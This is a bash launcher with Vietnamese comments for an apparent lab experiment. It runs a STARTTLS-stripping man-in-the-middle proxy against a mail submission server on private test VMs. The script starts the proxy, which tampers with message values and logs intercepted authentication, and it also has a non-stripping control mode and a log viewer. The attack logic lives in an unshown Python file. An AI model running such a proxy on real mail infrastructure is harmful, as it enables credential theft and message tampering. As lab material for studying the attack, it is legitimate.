#!/usr/bin/env bash
# Dieu hanh STARTTLS-strip proxy tren vm-atk (10.30.0.40).
#   sudo bash attacks/atk-run-strip-proxy.sh start
#   sudo bash attacks/atk-run-strip-proxy.sh control     (cham trung gian, KHONG an STARTTLS)
#   sudo bash attacks/atk-run-strip-proxy.sh show
#   sudo bash attacks/atk-run-strip-proxy.sh stop
set -euo pipefail

SELF="$(readlink -f "$0")"; PROJECT="$(dirname "$(dirname "$SELF")")"
EVID=/root/evidence/atk; mkdir -p "$EVID"
UPSTREAM="${UPSTREAM:-10.30.0.20:587}"     # mail1 submission (thay 10.30.0.30:25 neu can)
LOG="$EVID/at06-proxy.log"
ACTION="${1:?Thieu start | control | show | stop}"

case "$ACTION" in
  start)
    pkill -f strip_starttls.py 2>/dev/null || true
    nohup python3 "$PROJECT/attacks/strip_starttls.py" \
      --listen 2525 --upstream "$UPSTREAM" \
      --tamper 9999999999 1029384756 \
      --log "$LOG" > "$EVID/at06-proxy.stdout" 2>&1 &
    sleep 1
    echo "PID: $(pgrep -f strip_starttls.py || echo '(khong co)')"
    ss -ltn | grep ':2525' || { echo "LOI: proxy chua nghe cong 2525"; cat "$EVID/at06-proxy.stdout"; exit 1; }
    ;;
  control)
    pkill -f strip_starttls.py 2>/dev/null || true
    nohup python3 "$PROJECT/attacks/strip_starttls.py" \
      --listen 2525 --upstream "$UPSTREAM" --no-strip --log "$EVID/at06-proxy-control.log" \
      > "$EVID/at06-proxy.stdout" 2>&1 &
    sleep 1
    ss -ltn | grep ':2525' && echo "Proxy CHE DO DOI CHIEU (khong an STARTTLS, khong sua body) dang chay."
    ;;
  show)
    tail -60 "$LOG" 2>/dev/null || echo "Chua co log - chay at06 tren vm-client truoc."
    echo
    echo "--- Cac dong chung minh (loc rieng) ---"
    grep -E 'STRIP|TAMPER|AUTH-THIEP|AUTH\]' "$LOG" 2>/dev/null || true
    ;;
  stop)
    pkill -f strip_starttls.py 2>/dev/null || true
    sleep 1
    ss -ltn | grep ':2525' && echo "VAN CON proxy" || echo "Da tat proxy."
    ;;
  *) echo "start | control | show | stop"; exit 1 ;;
esac
